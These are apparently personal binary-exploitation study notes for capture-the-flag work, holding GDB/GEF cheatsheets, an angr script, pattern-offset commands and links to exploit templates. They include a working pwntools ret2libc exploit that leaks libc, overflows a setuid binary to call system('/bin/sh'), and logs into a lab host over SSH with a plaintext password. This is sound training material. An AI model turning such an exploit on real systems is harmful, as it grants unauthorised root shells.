# UltraPWN

https://www.youtube.com/playlist?list=PLt9cUwGw6CYHKBH5OoR8M2ELGlNlrgBKl
https://www.youtube.com/playlist?list=PLt9cUwGw6CYEmxx_3z1d-uT9zdEd58yOq
https://www.youtube.com/playlist?list=PLt9cUwGw6CYF6Kj19mBZpfhQPsRIC5vGl

Understand how https://github.com/xct/ropstar works to do it your self without automating or cheating


- better https://github.com/Crypto-Cat/CTF/blob/main/auto_ghidra.py

GDB Quick Commands
- disassemble: `disas <addr>`
- continue: `c`
- step: `s`
- step over: `n`
- finish function: `fin`
- dump memory: `x/20x <addr>`
- dump registers: `info registers`
- dump call stack: `bt`
- list breakpoints: `info break`
- memory mapping: `vmmap`
- heap infos: `heap chunks`,`print main_arena`
- show GOT: `print $_got()`
- pattern: `pattern create <n>`, `pattern search <offset>`
- shellcode: `shellcode search <arch>`, `shellcode get <num>`

```c
entry-break

```
`angr` for Kali Linux 
```bash
python3 -m venv myenv
source myenv/bin/activate
pip install angr
```
Use for binary Analysis
```python
import angr
import sys

# Author XCT from https://www.youtube.com/watch?v=UnZj5zzcBG4

# Use symbolic execution to explore all flow control possibilities of a program
# Then print out all the deadends of these explored states
def main(argv):
    binary = "CHANGE THIS"
    project = angr.Project(binary)
    init = project.factory.entry_state()
    simulation_manager = project.factory.simgr(init)
    simulation_manager.explore()
    for state in simulation_manager.deadended:
        print(state.posix.dumps(sys.stdin.fileno()))

if __name__ == '__main__':
    main(sys.argv)
```


gdb cheatsheet additions list
https://github.com/garyhooks/oscp/blob/master/Cheat_Sheets/Cheatsheet_GDB.txt


Gef ULTRA cheatsheet
```c
# Break at entry point
entry-break
# dump assemble code at the current point 
disassemble
# Set a breakpoint at a function call 
break $funcHandle.$funcHandle
# Set breakpoint at memory address
break *0x000133780085
run
```

```bash
msf-pattern_create -l 100 | xsel -b 

msf-pattern_offset -l 100 -q $address
```

PWNTOOLs - beware this very binary heaven specific
```python
from pwn import *
import struct

context.terminal = ['tmux', 'new-window']
target = './pwn_me'
context.binary = target
binary = ELF(target)
libc = ELF("./libc.so.6")

ssh_host = '10.10.232.171'
ssh_user = 'guardian'
ssh_pass = 'GOg0esGrrr!'
ssh_port = 22

if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
else:
    p = process(target,setuid=True)


p.recvline()
leak = p.recvline()[-11:].rstrip(b"\n")
system = int(leak[2:],16)
log.info(hex(system))
libc.address = system - libc.symbols['system']

buffer = b""
buffer += b"A"*32
buffer += p64(libc.symbols['system'])
buffer += p64(next(libc.search(b'/bin/sh\x00')))

gdb.attach(p, gdbscript='continue')
p.sendline(buffer)

p.interactive()

```

`ltrace`


Template Meta-gaming 
- https://notes.vulndev.io/wiki/redteam/binary-exploitation/templates
- https://notes.vulndev.io/wiki/redteam/templates
- https://github.com/nikosChalk/exploitation-training/blob/master/pwn-template.py
- https://notes.vulndev.io/wiki/redteam/binary-exploitation/templates


https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/07_reverse_engineering.md
```
(gdb) b main                           // sets breakpoint to main function
(gdb) b *0x5655792b                    // sets breakpoint on specific address
(gdb) run                              // starts debugging
(gdb) r                                // starts debugging
(gdb) r `python -c 'print "A"*200'`    // rerun the program with a specific parameter
(gdb) c                                // continue
(gdb) r Aa0Aa---snip---g5Ag            // run custom strings on a binary
(gdb) si                               // switch to instructions
(gdb) si enter                         // step-wise debugging
(gdb) x/s 0x555555556004               // x/s conversion
(gdb) p system                         // print memory address of system
(gdb) searchmem /bin/sh                // search within the binary
(gdb) disas main                       // disassemble main function
(gdb) b*0x080484ca                     // add a specific breakpoint
(gdb) x/100x $esp                      // getting EIP register
(gdb) x/100x $esp-400                  // locate in EIP register
(gdb) pattern create 48                // creates 48 character long pattern
(gdb) x/wx $rsp                        // finding rsp offset
(gdb) pattern search                   // finding pattern
(gdb) info functions <FUNCTION>        // getting function information
```


https://github.com/ChrisPritchard/ctf-writeups/blob/master/GDB-TIPS-AND-TRICKS.md


#### References

https://www.youtube.com/watch?v=wa3sMSdLyHw&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94
